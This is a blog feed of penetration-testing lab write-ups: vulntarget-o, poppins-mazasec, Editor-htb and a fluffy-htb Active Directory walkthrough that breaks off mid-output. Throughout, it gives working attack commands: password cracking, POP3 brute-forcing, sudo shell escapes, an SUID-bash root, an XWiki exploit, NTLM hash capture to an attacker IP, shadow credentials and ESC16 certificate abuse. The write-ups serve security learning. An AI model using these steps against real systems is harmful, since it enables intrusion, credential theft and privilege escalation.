去掉网络避免冲突\n强制进入bios\n启动之后，在bios界面，使用+-符号来移动顺序，mac上只能用-来移动，将cd作为第一个，然后f10保存即可\n进入登录界面按5下shift\n默认system权限\nnet user admin33 admin33 /add 账号admin33 密码admin33\rnet localgroup administrators admin33 /add 将新创建的用户 admin33 添加到 管理员组（administrators） ","date":"4 September 2025","externalUrl":null,"permalink":"/posts/vmwareesxivscenter/","section":"Posts","summary":"","title":"vmware-esxi-vscenter-靶场vulntarget-o","type":"posts"},{"content":"","date":"4 September 2025","externalUrl":null,"permalink":"/tags/vscenter/","section":"Tags","summary":"","title":"Vscenter","type":"tags"},{"content":"","date":"3 September 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":" poppips-mazasec-wp # 端口扫描 # nmap扫描: 发现110 995 邮件端口 -sV 版本探测 -sC 脚本扫描\r└─# nmap 172.20.10.2 -sV -sC\rStarting Nmap 7.92 ( https://nmap.org ) at 2025-09-03 02:47 EDT\rNmap scan report for interstellar.dsz (172.20.10.2)\rHost is up (0.000066s latency).\rNot shown: 996 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\r| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\r| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\r|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Mary Poppins - A Timeless Classic\r|_http-server-header: Apache/2.4.62 (Debian)\r110/tcp open pop3 Dovecot pop3d\r|_pop3-capabilities: RESP-CODES UIDL SASL(PLAIN) AUTH-RESP-CODE USER PIPELINING TOP STLS CAPA\r| ssl-cert: Subject: commonName=PyCrt.PyCrt\r| Subject Alternative Name: DNS:PyCrt.PyCrt\r| Not valid before: 2025-04-01T14:05:29\r|_Not valid after: 2035-03-30T14:05:29\r|_ssl-date: TLS randomness does not represent time\r995/tcp open ssl/pop3 Dovecot pop3d\r|_pop3-capabilities: USER SASL(PLAIN) RESP-CODES UIDL CAPA TOP AUTH-RESP-CODE PIPELINING\r| ssl-cert: Subject: commonName=PyCrt.PyCrt\r| Subject Alternative Name: DNS:PyCrt.PyCrt\r| Not valid before: 2025-04-01T14:05:29\r|_Not valid after: 2035-03-30T14:05:29\r|_ssl-date: TLS randomness does not represent time\rMAC Address: 08:00:27:B7:B0:C2 (Oracle VirtualBox virtual NIC)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 14.47 seconds 没发现什么特别的\n目录扫描 # 我们Dirsearch下\n[02:49:32] Starting: [02:49:32] 403 - 276B - /.ht_wsr.txt [02:49:32] 403 - 276B - /.htaccess.bak1 [02:49:32] 403 - 276B - /.htaccess.sample [02:49:32] 403 - 276B - /.htaccess.orig\r[02:49:32] 403 - 276B - /.htaccess.save [02:49:32] 403 - 276B - /.htaccess_sc [02:49:32] 403 - 276B - /.htaccess_extra\r[02:49:32] 403 - 276B - /.htaccess_orig\r[02:49:32] 403 - 276B - /.htaccessOLD\r[02:49:32] 403 - 276B - /.htaccessBAK [02:49:32] 403 - 276B - /.htaccessOLD2\r[02:49:32] 403 - 276B - /.htm\r[02:49:32] 403 - 276B - /.html [02:49:32] 403 - 276B - /.htpasswds [02:49:32] 403 - 276B - /.htpasswd_test [02:49:32] 403 - 276B - /.httr-oauth\r[02:49:33] 403 - 276B - /.php [02:49:50] 301 - 306B - /s -\u0026gt; http://172.20.10.2/s/ 注意这里有一个s 一般这时候看出来是嵌套的URL 就用dirb自动深度探测 [02:49:50] 403 - 276B - /server-status/ [02:49:50] 403 - 276B - /server-status Dirb探测\ndirb http://172.20.10.2 -w /root/zidianjiheinkali/dir/directory-list-2.3-medium.txt\rxxxxx省略下\r---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/ ----\r==\u0026gt; DIRECTORY: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/ ---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/ ----\r==\u0026gt; DIRECTORY: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ ---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ ----\r+ http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/index.html 访问index发现提示注意备份我们就扫描文件后缀就行\ngobuster dir -u http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,bak,backup,old,~\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: bak,backup,old,~,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 276]\r/index.html (Status: 200) [Size: 1531]\r/hash.bak (Status: 200) [Size: 3300]\r/.html (Status: 403) [Size: 276]\rProgress: 1323360 / 1323366 (100.00%)\r发现一个hash.bak 每行32位结果是md5用john来破解\rxxxxxx\r36038680b0a4dd318339c7d6f14e27d7\r9128262fabd151136a4f5173c9f8b687\ra16529ed27831262cbfb879bdb372813\rc3c016a1ded2e9139566365156ac0e10\r2118c709cb65868d19cc0eb70a1fd603\r1a4d5a0bd8e7ae4c52b75116e261ff53\r2ce6a8451b97c9fbf126feaabc020cfe\rdf5f5384aad29a7fd6530a00007c2321\r18e117c28e23c72258ed6b586c64d79a\rxxx 用john来破解要指定是Md5\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash\rUsing default input encoding: UTF-8\rLoaded 100 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])\rWarning: no OpenMP support for this hash type, consider --fork=2\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rkent12 (?) amotejoel (?) sunjoo (?) iydgmvin (?) elised (?) 530223 (?) viking35 (?) naughtycat (?) shadow626 (?) middelweg (?) eloscar (?) cash1407 (?) carlosmoya (?) xytyx1972 (?) vanity17 (?) v0nowns. (?) teadorohector (?) taroh527 (?) susancliford (?) suicida*02 (?) snoopymai12277++ (?) xxxxxxx 清理出其他符号放到文件里面来爆破邮件端口 因为SSH爆破不了只能密钥登录-收集下主页这些用户名\n爆破POP # hydra -L user.txt -P password.txt pop3://172.20.10.2:110 -V -I -f -u -t 64 -e nsr\rxxxxx\r[110][pop3] host: 172.20.10.2 login: Bert password: jmac92777 登录上去 telnet登录pop查看邮件\n──(root㉿kali)-[~] USER 用户名 PASS 密码 LIST 查看全部邮件 RETR 数字 选中查看\r└─# telnet 172.20.10.2 110\rTrying 172.20.10.2...\rConnected to 172.20.10.2.\rEscape character is \u0026#39;^]\u0026#39;.\r+OK Dovecot (Debian) ready\rUSER Bert\r+OK\rPASS jmac92777\r+OK Logged in.\rLIST\r+OK 1 messages:\r1 1517\r.\rRETR 1\r+OK 1517 octets\rReturn-path: \u0026lt;jane@poppins\u0026gt;\rEnvelope-to: bert@poppins\rDelivery-date: Fri, 29 Aug 2025 06:33:49 -0400\rReceived: from jane by Poppins with local (Exim 4.94.2)\r(envelope-from \u0026lt;jane@poppins\u0026gt;)\rid 1urwQW-0001RQ-CD\rfor bert@poppins; Fri, 29 Aug 2025 06:33:48 -0400\rTo: bert@poppins\rSubject: Urgent: Prod Server Credentials for Ansible Playbook\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026#34;UTF-8\u0026#34;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;E1urwQW-0001RQ-CD@Poppins\u0026gt;\rFrom: jane@poppins\rDate: Fri, 29 Aug 2025 06:33:48 -0400\rHi Bert,\rI\u0026#39;ve just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. It\u0026#39;s ready to go.\rThe playbook contains some sensitive API keys, so I\u0026#39;ve encrypted the variables using Ansible Vault. You\u0026#39;ll need to use the `ansible-vault decrypt` command to run it.\rHere is the vault string you\u0026#39;ll need to paste into the `secrets.yml` file.\r```\r$ANSIBLE_VAULT;1.1;AES256\r66626631636362303332633238373338386634373434646532656534323230333938303331663630\r3236333934663930343263363831353138323630393134320a366366393939373636386538336336\r34353536656637313762323832643339633234656635326137633439303730373335386536306436\r6335363366376634630a326563623737626337353436323565643365333061663661396337613731\r3730\r```\rLet me know if you hit any issues. We need to get this deployed by EOD.\rThanks,\rJane 解密ANSIBLE密钥 # 发现一个ANSIBLE密钥 使用ansible2john.py 传为HASH来破解\nJohnTheRipper/run/ansible2john.py at bleeding-jumbo · big-main/JohnTheRipper\npython3 ansible2john.py secert.yml secert.yml:$ansible$0*0*fbf1ccb032c287388f4744de2ee4220398031f6026394f9042c6815182609142*2ecb77bc754625ed3e30af6a9c7a7170*6cf9997668e83c64556ef717b282d39c24ef52a7c490707358e60d6c563f7f4c\rjohn --wordlist=/usr/share/wordlists/rockyou.txt secert.yml\rsecert.yml:javiel 密码为javiel 然后使用 使用 ansible-vault解密 得到密码cumibug 这个工具对python环境有要求可以开启一个虚拟环境\n激活环境\rpython3.12 -m venv ansible-env\r/root/ansible-env/bin/activate\r退出deactivate\r└─# ansible-vault decrypt secert.yml Vault password: Decryption successful\r┌──(ansible-env)─(root㉿kali)-[~/ansible-env]\r└─# cat secert.yml cumibug\r┌──(ansibl 这时候卡了不知道干嘛的 前面还得到了一个用户因为其他用户他不识别你的密码，但是这个用户他识别\n提权主要用户 # ssh jane@172.20.10.2 密码javiel 这个用户sudo -l没有 -\rsu michael 密码就是 cumibug sudo -l 有 (winifred) PASSWD: /usr/bin/mail * 输入自己的密码就可以执行这个不是需要这个用户密码\r提权：到winifred用户\rsudo -u winifred /usr/bin/mail -f /etc/passwd\rmichael@Poppins:~$ sudo -u winifred /usr/bin/mail -f /etc/passwd\rMail version 8.1.2 01/15/2001. Type ? for help.\r\u0026#34;/etc/passwd\u0026#34;: 0 messages [Read only]\r\u0026amp; \u0026amp; whoami\rUnknown command: \u0026#34;whoami\u0026#34;\r\u0026amp; !/bin/bash\rwinifred@Poppins:/home/michael$ whoami\rwinifred\rwinifred@Poppins:/home/michael$ sudo -l\rMatching Defaults entries for winifred on Poppins:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser winifred may run the following commands on Poppins:\r(ALL) NOPASSWD: /usr/bin/ansible *\rwinifred@Poppins:/home/michael$ pwd 提权根用户 # 它可以用ansible\nansible 是运维的软件\nsudo /usr/bin/ansible localhost -c local -m command -a \u0026ldquo;chmod +s /bin/bash\u0026rdquo; 执行命令\nwinifred@Poppins:~$ sudo /usr/bin/ansible localhost -c local -m command -a \u0026#34;chmod +s /bin/bash\u0026#34;\r[WARNING]: No inventory was parsed, only implicit localhost is available\r[WARNING]: Consider using the file module with mode rather than running \u0026#39;chmod\u0026#39;. If you need to use comman\rbecause file is insufficient you can add \u0026#39;warn: false\u0026#39; to this command task or set \u0026#39;command_warnings=False\u0026#39;\rin ansible.cfg to get rid of this message.\rlocalhost | CHANGED | rc=0 \u0026gt;\u0026gt;\rwinifred@Poppins:~$ ls -al /bin/bash\r-rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bash\rwinifred@Poppins:~$ /bin/bash -p\rbash-5.0# whoami\rroot\rbash-5.0# cat /root/root.txt learning # 1.备份文件后缀 html,bak,backup,old,~\n2.ansible2john.py john破解密码\n3.指定md5破解 john --format=raw-md5 \u0026ndash;wordlist=/usr/share/wordlists/rockyou.txt hash\n4.渗透中的用户名收集 密码收集\n","date":"3 September 2025","externalUrl":null,"permalink":"/posts/poppips-mazasec/","section":"Posts","summary":"","title":"poppips-mazasec","type":"posts"},{"content":" Editor-htb # 端口扫描8080进去 # ┌──(root㉿kali)-[~] └─# nmap 10.10.11.80\nStarting Nmap 7.92 ( https://nmap.org ) at 2025-09-02 12:19 CST Nmap scan report for editor.htb (10.10.11.80) Host is up (1.3s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy\n发现是一共XWIKI用POC打\nhackersonsteroids/cve-2025-24893: Modified exploit for CVE-2025-24893\n拿到shell # find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name \u0026#34;*config*\u0026#34; -o -name \u0026#34;*.properties\u0026#34; -o -name \u0026#34;*.xml\u0026#34; 2\u0026gt;/dev/null\r查询数据库文件\r$ find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name \u0026#34;*config*\u0026#34; -o -name \u0026#34;*.properties\u0026#34; -o -name \u0026#34;*.xml\u0026#34; 2\u0026gt;/dev/null\r/var/lib/xwiki/data/configuration.properties\r/var/lib/xwiki/data/store/file/xwiki/b/f/8fb536bfe96480556241885cb20974/attachments/e/6/d4cbb35779b27121c39efde2a23520/~METADATA.xml\r/var/lib/xwiki/data/store/solr/events_9/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/events_9/core.properties\r/var/lib/xwiki/data/store/solr/extension_index_9/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/extension_index_9/core.properties\r/var/lib/xwiki/data/store/solr/solr.xml\r/var/lib/xwiki/data/store/solr/events/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/events/core.properties\r/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.xml\r/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.properties\r/var/lib/xwiki/data/store/solr/search/conf/elevate.xml\r/var/lib/xwiki/data/store/solr/search/conf/currency.xml\r/var/lib/xwiki/data/store/solr/search/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/search/core.properties\r/var/lib/xwiki/data/store/solr/search_9/conf/managed-schema.xml\r/var/lib/xwiki/data/store/solr/search_9/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/search_9/core.properties\r/var/lib/xwiki/data/store/solr/extension_index/conf/solrconfig.xml\r/var/lib/xwiki/data/store/solr/extension_index/core.properties\r/var/lib/xwiki/data/extension/history/2025.06.13.xml\r/var/lib/xwiki/data/jobs/status/store.properties\r/var/lib/xwiki/data/jobs/status/3/distribution/log.xml\r/var/lib/xwiki/data/jobs/status/3/solr/indexer/log.xml\r/var/lib/xwiki/data/jobs/status/extension/index/log.xml\r/var/lib/xwiki/data/jobs/status/solr/indexer/log.xml\r/var/lib/xwiki/tmp/start_1826614924204897555.properties\r/etc/xwiki/portlet.xml\r/etc/xwiki/jetty-web.xml\r/etc/xwiki/jetty-ee8-web.xml\r/etc/xwiki/cache/infinispan/config.xml\r/etc/xwiki/hibernate.cfg.xml\r/etc/xwiki/xwiki.properties\r/etc/xwiki/sun-web.xml\r/etc/xwiki/web.xml\r/etc/xwiki/jboss-deployment-structure.xml\r/etc/xwiki/xwiki-tomcat9.xml\r/etc/xwiki/version.properties\r/etc/xwiki/logback.xml 问了下AI 查看这个文件\n$ cat /etc/xwiki/hibernate.cfg.xml\n\u0026lt;property name=\u0026#34;hibernate.connection.username\u0026#34;\u0026gt;xwiki\u0026lt;/property\u0026gt;\r\u0026lt;property name=\u0026#34;hibernate.connection.password\u0026#34;\u0026gt;theEd1t0rTeam99\u0026lt;/property\u0026gt;\r\u0026lt;property name=\u0026#34;hibernate.connection.driver_class\u0026#34;\u0026gt;com.mysql.cj.jdbc.Driver\u0026lt;/property\u0026gt;\r\u0026lt;property name=\u0026#34;hibernate.dbcp.poolPreparedStatements\u0026#34;\u0026gt;true\u0026lt;/property\u0026gt;\r\u0026lt;property name=\u0026#34;hibernate.dbcp.maxOpenPreparedStatements\u0026#34;\u0026gt;20\u0026lt;/property\u0026gt;\r拿到了数据库账号密码 查看passwd\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\rsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rpollinate:x:105:1::/var/cache/pollinate:/bin/false\rsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\rsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\ruuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\rtcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\rtss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\rlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\rfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\rusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\rlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\rdnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\rmysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false\rtomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin\rxwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin\rnetdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin\roliver:x:1000:1000:,,,:/home/oliver:/bin/bash\r_laurel:x:995:995::/var/log/laurel:/bin/false\r发现用户oliver 这里数据库密码可以登录\n发现一个suid程序ndsudo\n这里你执行nvme-list 他会执行 nvme程序 所以我们用变量劫持\n#include \u0026lt;unistd.h\u0026gt; int main() { setuid(0); setgid(0); execl(\u0026#34;/bin/bash\u0026#34;, \u0026#34;bash\u0026#34;, NULL); return 0; } 编译后传上去 scp nvme oliver@10.10.11.80:/tmp oliver@10.10.11.80\u0026#39;s password: nvme export PATH=/tmp:$PATH 成功提权\nlearning # Xwiki POC https://github.com/hackersonsteroids/cve-2025-24893\rfind /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name \u0026#34;*config*\u0026#34; -o -name \u0026#34;*.properties\u0026#34; -o -name \u0026#34;*.xml\u0026#34; 2\u0026gt;/dev/null 搜索\rMySQL/MariaDB /etc/mysql/my.cnf 或 /etc/my.cnf 关键配置文件\r/etc/xwiki/hibernate.cfg.xml XWiki 企业 wiki 平台核心数据库配置文件，\rexport PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径 ","date":"2 September 2025","externalUrl":null,"permalink":"/posts/editor-htb/","section":"Posts","summary":"","title":"Editor-htb","type":"posts"},{"content":"","date":"2 September 2025","externalUrl":null,"permalink":"/tags/esc16/","section":"Tags","summary":"","title":"ESC16","type":"tags"},{"content":" fluffy-htb # 给了一个账号\nj.fleischman / J0elTHEM4n1990!\nNmap扫描 # 添加到hosts里\r10.10.11.69 DC01.fluffy.htb fluffy.htb 添加hosts 登录 SMB 服务后，工具会自动尝试从 RID 1000 开始递增枚举（通常域用户 RID 从 1000 起），向域控发送查询请求，获取每个 RID 对应的 用户名、组名或计算机名。\rcrackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990 --shares 枚举smb共享目录信息 选中SidtypeUser组 以\\分割 选中第二部分 不选择空格 放到users.txt中\ncrackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! \u0026ndash;rid-brute | grep \u0026ldquo;SidTypeUser\u0026rdquo; | awk -F \u0026lsquo;\\\u0026rsquo; \u0026lsquo;{print $2}\u0026rsquo; | awk \u0026lsquo;{print $1}\u0026rsquo; \u0026gt; users.txt\n试一下密码喷射发现不行\n进入SMB目录寻找讯息\r这里有一个PDF 我们打开提示了 CVE信息\rCVE-2025-24071_PoC-main https://github.com/0x6rss/CVE-2025-24071_PoC/\npython poc.py └─# python poc.py\nEnter your file name: exp Enter IP (EX: 192.168.1.162): 10.10.16.9 completed\n放入生成的文件\ndrw-rw-rw- 0 Tue Sep 2 21:39:52 2025 .\ndrw-rw-rw- 0 Tue Sep 2 21:39:52 2025 ..\ndrw-rw-rw- 0 Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64\n-rw-rw-rw- 1827464 Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64.zip\ndrw-rw-rw- 0 Fri May 16 22:51:49 2025 KeePass-2.58\n-rw-rw-rw- 3225346 Fri May 16 22:51:49 2025 KeePass-2.58.zip\n-rw-rw-rw- 169963 Sat May 17 22:31:07 2025 Upgrade_Notice.pdf\nput exploit.zip 放入文件\n然后监听\nresponder -I tun0 -wvF\n我们获得了一个账号密码 用john破解下 prometheusx-303 (p.agila)\n使用bloodhound来分析域环境 # bloodhound-python -u j.fleischman -p J0elTHEM4n1990! -k -d fluffy.htb \u0026ndash;zip -c All -dc dc01.fluffy.htb -ns 10.10.11.69 \u0026ndash;dns-tcp\n通过上面两个图可以得出\nP.AGILA属于SERVICE管理组 这个组对service account有全部通用权限 这个serviceaccount 可以管理三个用户\nSERVICE ACCOUNTS 对 ca_svc、ldap_svc、winrm_svc 等账户有 GenericWrite 权限， 这意味着可以向这些账户添加自定义 KeyCredentia\n影子攻击 # 这里提示什么时间就ntpdata同步下和DC的时间 提示权限就重新执行加入组命令 https://github.com/CravateRouge/BloodyAD\n先添加用户到该组获得执行那三个系统用户权限-如果后面提示拒绝就重新运行下这个命令\r命令成功运行后，p.agila 用户会被添加到 SERVICE ACCOUNTS 组中，成为该组的成员。 └─# bloodyAD -d fluffy.htb -u p.agila -p \u0026lsquo;prometheusx-303\u0026rsquo; \u0026ndash;dc-ip 10.10.11.69 add groupMember \u0026lsquo;SERVICE ACCOUNTS\u0026rsquo; p.agila\n[+] p.agila added to SERVICE ACCOUNTS 成功添加\n获得winrm用户的hash\ncertipy-ad shadow auto -u \u0026lsquo;p.agila@fluffy.htb\u0026rsquo; -p \u0026lsquo;prometheusx-303\u0026rsquo; -account \u0026lsquo;winrm_svc\u0026rsquo; -target dc01.fluffy.htb -dc-ip 10.10.11.69\n使用evil登录获得user.flag\n获取ca_svc用户 NTLM hash certipy-ad shadow auto -u \u0026lsquo;p.agila@fluffy.htb\u0026rsquo; -p \u0026lsquo;prometheusx-303\u0026rsquo; -account \u0026lsquo;ca_svc\u0026rsquo; -target dc01.fluffy.htb -dc-ip 10.10.11.69\n执行下面寻找有无漏洞命令提示不存在模板需要更新下需要更新版本\ncertipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable\nly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse\n进去后pip install . 需要python版本\u0026gt;=12 如果python版本不匹配还要下载python 3.12.0.4\nsource certipy-3.12-env/bin/activate 激活pip虚拟环境\ncertipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable\n发现漏洞ESC16\nESC16 # certipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -user \u0026#39;ca_svc\u0026#39; read\r将受害者账户的 UPN 更新为目标管理员的 sAMAccountName。\rcertipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;administrator\u0026#39; -user \u0026#39;ca_svc\u0026#39; update\r以 p.agila 身份为 ca_svc 账户添加影子凭据（修改 msDS-KeyCredentialLink 属性），并自动完成证书申请与认证，最终获取 ca_svc 的 NT 哈希或票据。\rcertipy shadow -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -account \u0026#39;ca_svc\u0026#39; auto\rexport KRB5CCNAME=ca_svc.ccache certipy req -k -dc-ip \u0026#39;10.10.11.69\u0026#39; -target \u0026#39;DC01.FLUFFY.HTB\u0026#39; -ca \u0026#39;fluffy-DC01-CA\u0026#39; -template \u0026#39;User\u0026#39;\r还原“受害者”帐户的 UPN。\rcertipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;ca_svc@fluffy.htb\u0026#39; -user \u0026#39;ca_svc\u0026#39; update\r以目标管理员身份进行身份验证。\rcertipy auth -dc-ip \u0026#39;10.10.11.69\u0026#39; -pfx \u0026#39;administrator.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;fluffy.htb\u0026#39;\r1：验证 p.agila 是否对 ca_svc 有基本的读取权限（为后续修改操作铺路）；\ncertipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -user \u0026#39;ca_svc\u0026#39; read\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Reading attributes for \u0026#39;ca_svc\u0026#39;:\rcn : certificate authority service\rdistinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\rname : certificate authority service\robjectSid : S-1-5-21-497550768-2797716248-2627064577-1103\rsAMAccountName : ca_svc\rservicePrincipalName : ADCS/ca.fluffy.htb\ruserPrincipalName : ca_svc@fluffy.htb\ruserAccountControl : 66048\rwhenCreated : 2025-04-17T16:07:50+00:00\rwhenChanged : 2025-09-02T15:31:47+00:00 2：将 ca_svc 的 UPN 临时修改为 administrator\nUPN（用户主体名称） 是域用户的唯一标识（格式：用户名@域名），修改为 administrator 后，ca_svc 在证书申请时会被识别为 administrator； 实际完整格式是 administrator@fluffy.htb），是为了欺骗证书服务器（CA）： CA 在验证证书申请时，会检查申请者的 UPN 是否符合模板权限。修改后，CA 会误认为是 administrator 本人在申请证书，从而颁发高权限证书，实现 “伪装身份” 的目的。 certipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;administrator\u0026#39; -user \u0026#39;ca_svc\u0026#39; update\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Updating user \u0026#39;ca_svc\u0026#39;:\ruserPrincipalName : administrator\r[*] Successfully updated \u0026#39;ca_svc\u0026#39; 3：为 ca_svc 添加影子凭据，获取认证材料\n影子凭据：通过修改 ca_svc 的 msDS-KeyCredentialLink 属性，添加一个新的密钥对，本质是为 ca_svc 注入一个可控的 “虚拟密码” 生成一个密钥文件\ncertipy shadow -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -account \u0026#39;ca_svc\u0026#39; auto\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Targeting user \u0026#39;ca_svc\u0026#39;\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating Key Credential\r[*] Key Credential generated with DeviceID \u0026#39;7ce9744427f5487f82ef4285adb01852\u0026#39;\r[*] Adding Key Credential with device ID \u0026#39;7ce9744427f5487f82ef4285adb01852\u0026#39; to the Key Credentials for \u0026#39;ca_svc\u0026#39;\r[*] Successfully added Key 